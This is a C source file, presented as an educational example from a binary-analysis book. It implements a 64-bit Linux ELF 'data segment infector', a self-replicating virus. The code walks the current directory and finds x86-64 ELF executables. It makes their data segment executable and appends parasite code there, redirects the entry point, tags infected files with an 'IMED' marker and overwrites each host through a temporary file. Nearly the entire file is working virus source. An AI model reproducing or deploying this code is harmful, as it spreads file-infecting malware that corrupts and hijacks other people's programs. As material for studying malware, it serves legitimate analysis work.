/***
 * Example of Data Infector
 * for 64 bits, no library
 * nor dependency is used.
 * Based on the technique
 * presented in the book
 * Learning Linux Binary Analysis.
 * 
 * gcc -fpic -pie -nostdlib
 * 
 */

#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <elf.h>
#include <fcntl.h>
#include <sys/user.h>

typedef struct linux_dirent64
{
    uint64_t d_ino;          /* 64-bit inode number */
    int64_t d_off;           /* 64-bit offset to next structure */
    unsigned short d_reclen; /* Size of this dirent */
    unsigned char d_type;    /* File type */
    char d_name[];           /* Filename (null-terminated) */
} linux_dirent64_t;

/*
* Some useful macros   
*/

// number of syscall in x86-64
#define __NR_READ 0
#define __NR_WRITE 1
#define __NR_OPEN 2
#define __NR_CLOSE 3
#define __NR_STAT 4
#define __NR_FSTAT 5
#define __NR_LSEEK 8
#define __NR_MMAP 9
#define __NR_MUNMAP 11
#define __NR_EXIT 60

#define __NR_RENAME 82

#define __NR_GETDENTS64 217

#define pushad "push %rax\n" \
               "push %rcx\n" \
               "push %rdx\n" \
               "push %rbx\n" \
               "push %rbp\n" \
               "push %rsi\n" \
               "push %rdi\n"

#define popad "pop %rdi\n" \
              "pop %rsi\n" \
              "pop %rbp\n" \
              "pop %rbx\n" \
              "pop %rdx\n" \
              "pop %rcx\n" \
              "pop %rax\n"

#define BUF_SIZE 4096
#define PAGE_ALIGN(x) (x & ~(PAGE_SIZE - 1))
#define PAGE_ALIGN_UP(x) (PAGE_ALIGN(x) + PAGE_SIZE)
#define WORD_ALIGN(x) ((x + 7) & ~7)

/*
* Functions declarations
*/

void _exit(int status);

/* file stuff */
ssize_t _read(int fd, void *buf, size_t count);
ssize_t _write(int fd, const void *buf, size_t count);
off_t _lseek(int fd, off_t offset, int whence);

int _open(const char *pathname, int flags);
int _open2(const char *pathname, int flags, mode_t mode);
int _close(int fd);
int _getdents64(unsigned int fd, linux_dirent64_t *dirp, unsigned int count);

int _rename(const char *oldpath, const char *newpath);

int _stat(const char *pathname, struct stat *statbuf);
int _fstat(int fd, struct stat *statbuf);

/* memory stuff */
void *_malloc(size_t len);
int _munmap(unsigned long addr, unsigned long len);

/* string and buffers stuff */
int _memcmp(const void *str1, const void *str2, size_t n);
int _strcmp(const char *p1, const char *p2);
size_t _strlen(const char *p1);
int _puts(const char *str);

uint64_t get_rip();
uint64_t get_elf_base();
void end_code();
void write_parasite_in_file(size_t parasite_size, uint8_t *mem, struct stat *st, char *host, Elf32_Addr old_e_entry, Elf64_Addr parasite_addr);

extern uint64_t entry_point; // address of entry point of the program
extern uint64_t final_address;
extern uint64_t delta_address;

__attribute__((naked)) int
_start()
{
    __asm__(
        ".globl entry_point\n"
        "entry_point:\n" pushad
        "call _main\n" popad
        "jmp final_address\n");
}

int _main()
{
    char elf_mark[] = {'E', 'L', 'F'};
    char cwd[] = {'.', '\0'};
    char *host; // pointer to file name

    char buf[BUF_SIZE];
    uint8_t *mem = NULL;
    linux_dirent64_t *dirent;
    struct stat st;

    char *shstrdx;
    char bss_section[] = {'.', 'b', 's', 's', 0};

    int magic = 'IMED';
    int nbytesread = 0;
    int i;

    int dir_fd, fd;
    int byte_pos;

    Elf64_Ehdr *elf_ehdr;
    Elf64_Phdr *elf_phdr;
    Elf64_Shdr *elf_shdr;
    Elf32_Addr old_entry_point;
    Elf64_Addr parasite_addr;

    int bss_found = 0;

    size_t parasite_size = ((char *)&final_address - (char *)&entry_point);
    parasite_size += 7;

    // open the directory
    dir_fd = _open(cwd, O_RDONLY | O_DIRECTORY);

    if (dir_fd == -1)
        _exit(1);

    // read all structures through
    // get dents
    nbytesread = _getdents64(dir_fd, (linux_dirent64_t *)buf, BUF_SIZE);

    for (byte_pos = 0; byte_pos < nbytesread;)
    {
        dirent = (linux_dirent64_t *)(buf + byte_pos);
        // advance to next structure
        byte_pos += dirent->d_reclen;

        host = dirent->d_name;

        // avoid . and ..
        if (host[0] == '.')
            continue;

        if (_strlen(host) >= 2 &&
            host[0] == 'd' &&
            host[1] == 'e')
            continue;

        if (dirent->d_type != DT_REG)
            continue;

        // open the file to check if infect it
        fd = _open(host, O_RDONLY);

        if (fd == -1)
            continue;

        // get stats from the file
        _fstat(fd, &st);

        if (!S_ISREG(st.st_mode)) // if is not REG (another check)
        {
            _close(fd);
            continue;
        }

        mem = (uint8_t *)_malloc(st.st_size);

        if (_read(fd, mem, st.st_size) == -1)
        {
            _close(fd);
            _munmap((unsigned long)mem, st.st_size);
            continue;
        }

        elf_ehdr = (Elf64_Ehdr *)mem;

        // not an ELF, continue
        if (elf_ehdr->e_ident[0] != 0x7f &&
            !_memcmp(&elf_ehdr->e_ident[1], elf_mark, 3))
        {
            _close(fd);
            _munmap((unsigned long)mem, st.st_size);
            continue;
        }

        if (elf_ehdr->e_type != ET_EXEC &&
            (elf_ehdr->e_machine != EM_X86_64 ||
             elf_ehdr->e_machine != EM_IA_64))
        {
            _close(fd);
            _munmap((unsigned long)mem, st.st_size);
            continue;
        }

        // check if it's infected
        int m = *(int *)&elf_ehdr->e_ident[EI_PAD];

        if (m == magic)
        {
            _close(fd);
            _munmap((unsigned long)mem, st.st_size);
            continue;
        }

        // in other case start infecting
        elf_phdr = (Elf64_Phdr *)(mem + elf_ehdr->e_phoff);

        for (i = 0; i < elf_ehdr->e_phnum; i++)
        {
            // Search for DATA segment
            if (elf_phdr[i].p_type == PT_LOAD && elf_phdr[i].p_flags == (PF_R | PF_W))
            {
                old_entry_point = elf_ehdr->e_entry;

                // modify the entry point
                elf_ehdr->e_entry = elf_phdr[i].p_vaddr + elf_phdr[i].p_filesz;

                parasite_addr = elf_phdr[i].p_offset + elf_phdr[i].p_filesz;
                // fix the values
                elf_phdr[i].p_filesz += PAGE_ALIGN_UP(parasite_size);
                elf_phdr[i].p_memsz += PAGE_ALIGN_UP(parasite_size);
                // add execution flag
                elf_phdr[i].p_flags |= PF_X;
                break;
            }
        }

        // fix .bss section
        elf_shdr = (Elf64_Shdr *)(mem + elf_ehdr->e_shoff);

        shstrdx = (char *)(mem + elf_shdr[elf_ehdr->e_shstrndx].sh_offset);

        bss_found = 0;

        for (i = 0; i < elf_ehdr->e_shnum; i++)
        {
            if (!_strcmp(&shstrdx[elf_shdr[i].sh_name], bss_section))
            {
                elf_shdr[i].sh_addr += PAGE_ALIGN_UP(parasite_size);
                elf_shdr[i].sh_offset += PAGE_ALIGN_UP(parasite_size);
                bss_found = 1;
            }
            else if (bss_found)
            {
                elf_shdr[i].sh_addr += PAGE_ALIGN_UP(parasite_size);
                elf_shdr[i].sh_offset += PAGE_ALIGN_UP(parasite_size);
            }
        }

        elf_ehdr->e_shoff += PAGE_ALIGN_UP(parasite_size);

        write_parasite_in_file(parasite_size, mem, &st, host, old_entry_point, parasite_addr);

        _close(fd);
        _munmap(mem, st.st_size);
    }
}

void 
write_parasite_in_file(size_t parasite_size, uint8_t *mem, struct stat *st, char *host, Elf32_Addr old_e_entry, Elf64_Addr parasite_addr)
{
    int ofd;
    char tmp_file[] = {'/', 't', 'm', 'p', '/', '.', 't', 'm', 'p', '.', 'b', 'i', 'n', '\0'};
    int magic = 'IMED';
    Elf64_Ehdr *elf_ehdr = (Elf64_Ehdr *)mem;

    char jmp_code[7];

    if (elf_ehdr->e_type == ET_EXEC)
    {
        jmp_code[0] = '\x68'; /* push */
        jmp_code[1] = '\x00'; /* 00 	*/
        jmp_code[2] = '\x00'; /* 00	*/
        jmp_code[3] = '\x00'; /* 00	*/
        jmp_code[4] = '\x00'; /* 00	*/
        jmp_code[5] = '\xc3'; /* ret */
        jmp_code[6] = 0;

        *(uint32_t *)&jmp_code[1] = (uint32_t)old_e_entry;
    }

    // infect the file
    *(int *)&elf_ehdr->e_ident[EI_PAD] = magic;

    // open new file
    ofd = _open2(tmp_file, O_CREAT | O_WRONLY | O_TRUNC, st->st_mode);
    if (ofd == -1)
    {
        return;
    }

    // write content until the parasite
    if (_write(ofd, mem, parasite_addr) == -1)
    {
        _close(ofd);
        return;
    }

    // write parasite
    if (_write(ofd, (const void *)&entry_point, parasite_size - 7) == -1)
    {
        _close(ofd);
        return;
    }

    // write jump
    if (_write(ofd, (const void *)&jmp_code, 7) == -1)
    {
        _close(ofd);
        return;
    }

    _lseek(ofd, parasite_addr+PAGE_ALIGN_UP(parasite_size), SEEK_SET);

    // write rest of file
    if (_write(ofd, (mem + parasite_addr), (st->st_size - parasite_addr)) == -1)
    {
        _close(ofd);
        return;
    }

    _close(ofd);

    _rename(tmp_file, host);

    return;
}

void _exit(int status)
{
    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rax\n"
        "syscall\n"
        :
        : "g"(status), "g"(__NR_EXIT));
}

ssize_t
_read(int fd, void *buf, size_t count)
{
    ssize_t ret;

    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rdx\n"
        "mov %3, %%rax\n"
        "syscall\n"
        :
        : "g"(fd), "g"(buf), "g"(count), "g"(__NR_READ));

    __asm__ volatile("mov %%rax, %0"
                     : "=r"(ret));

    return ret;
}

ssize_t
_write(int fd, const void *buf, size_t count)
{
    ssize_t ret;

    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rdx\n"
        "mov %3, %%rax\n"
        "syscall\n"
        :
        : "g"(fd), "g"(buf), "g"(count), "g"(__NR_WRITE));

    __asm__ volatile("mov %%rax, %0"
                     : "=r"(ret));

    return ret;
}

off_t _lseek(int fd, off_t offset, int whence)
{
    off_t ret;

    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rdx\n"
        "mov %3, %%rax\n"
        "syscall\n"
        :
        : "g"(fd), "g"(offset), "g"(whence), "g"(__NR_LSEEK));

    __asm__ volatile("mov %%rax, %0"
                     : "=r"(ret));

    return ret;
}

int _open(const char *pathname, int flags)
{
    int fd;

    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rax\n"
        "syscall\n"
        :
        : "g"(pathname), "g"(flags), "g"(__NR_OPEN));

    __asm__ volatile("mov %%eax, %0"
                     : "=r"(fd));

    return fd;
}

int _open2(const char *pathname, int flags, mode_t mode)
{
    int fd;

    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rdx\n"
        "mov %3, %%rax\n"
        "syscall\n"
        :
        : "g"(pathname), "g"(flags), "g"(mode), "g"(__NR_OPEN));

    __asm__ volatile("mov %%eax, %0"
                     : "=r"(fd));

    return fd;
}

int _close(int fd)
{
    int ret;

    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rax\n"
        "syscall\n"
        :
        : "g"(fd), "g"(__NR_CLOSE));

    __asm__ volatile("mov %%eax, %0"
                     : "=r"(ret));

    return ret;
}

int _getdents64(unsigned int fd, linux_dirent64_t *dirp, unsigned int count)
{
    int ret;

    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rdx\n"
        "mov %3, %%rax\n"
        "syscall\n"
        :
        : "g"(fd), "g"(dirp), "g"(count), "g"(__NR_GETDENTS64));

    __asm__ volatile("mov %%eax, %0"
                     : "=r"(ret));

    return ret;
}

int _rename(const char *oldpath, const char *newpath)
{
    int ret;

    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rax\n"
        "syscall\n"
        :
        : "g"(oldpath), "g"(newpath), "g"(__NR_RENAME));

    __asm__ volatile("mov %%eax, %0"
                     : "=r"(ret));

    return ret;
}

int _stat(const char *pathname, struct stat *statbuf)
{
    int ret;

    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rax\n"
        "syscall\n"
        :
        : "g"(pathname), "g"(statbuf), "g"(__NR_STAT));

    __asm__ volatile("mov %%eax, %0"
                     : "=r"(ret));

    return ret;
}

int _fstat(int fd, struct stat *statbuf)
{
    int ret;

    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rax\n"
        "syscall\n"
        :
        : "g"(fd), "g"(statbuf), "g"(__NR_FSTAT));

    __asm__ volatile("mov %%eax, %0"
                     : "=r"(ret));

    return ret;
}

static void *
_mmap(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off)
{
    // use stack variables
    // to load some parameters
    long mmap_fd = fd;
    unsigned long mmap_off = off;
    unsigned long mmap_flags = flags;
    unsigned long ret;

    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rdx\n"
        "mov %3, %%r10\n"
        "mov %4, %%r8\n"
        "mov %5, %%r9\n"
        "mov %6, %%rax\n"
        "syscall\n"
        :
        : "g"(addr), "g"(len), "g"(prot), "g"(mmap_flags), "g"(mmap_fd), "g"(mmap_off), "g"(__NR_MMAP));

    __asm__ volatile("mov %%rax, %0"
                     : "=r"(ret));
    return (void *)ret;
}

int _munmap(unsigned long addr, unsigned long len)
{
    int ret;
    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rax\n"
        "syscall\n"
        :
        : "g"(addr), "g"(len), "g"(__NR_MUNMAP));

    __asm__ volatile("mov %%eax, %0"
                     : "=r"(ret));

    return ret;
}

void *
_malloc(size_t len)
{
    void *mem = _mmap((unsigned long)NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (mem == (void *)-1)
        return NULL;

    return mem;
}

int _memcmp(const void *str1, const void *str2, size_t n)
{
    register const unsigned char *s1 = (const unsigned char *)str1;
    register const unsigned char *s2 = (const unsigned char *)str2;

    while (n-- > 0)
    {
        if (*s1++ != *s2++)
            return s1[-1] < s2[-1] ? -1 : 1;
    }

    return 0;
}

int _strcmp(const char *p1, const char *p2)
{
    register const unsigned char *s1 = (const unsigned char *)p1;
    register const unsigned char *s2 = (const unsigned char *)p2;
    register unsigned char c1, c2;

    do
    {
        c1 = *s1++;
        c2 = *s2++;

        if (c1 == '\0')
            return c1 - c2;
    } while (c1 == c2);

    return c1 - c2;
}

size_t
_strlen(const char *p1)
{
    register const char *s1 = p1;
    register const char *s2 = p1;

    while (*s2++ != 0)
        ;

    s1++;

    return (size_t)(s2 - s1);
}

int _puts(const char *str)
{
    size_t str_len;
    int ret;

    str_len = _strlen(str);

    ret = (int)_write(STDOUT_FILENO, str, str_len);

    return ret;
}

uint64_t get_rip()
{
    __asm__(
        "call delta_address\n"
        ".globl delta_address\n"
        "delta_address:\n"
        "pop %rax");
}

__attribute__((naked)) void
end_code()
{
    __asm__(
        ".globl final_address\n"
        "final_address:\n"
        "mov %0, %%rdi\n"
        "mov %1, %%rax\n"
        "syscall\n"
        :
        : "g"(0), "g"(__NR_EXIT));
}
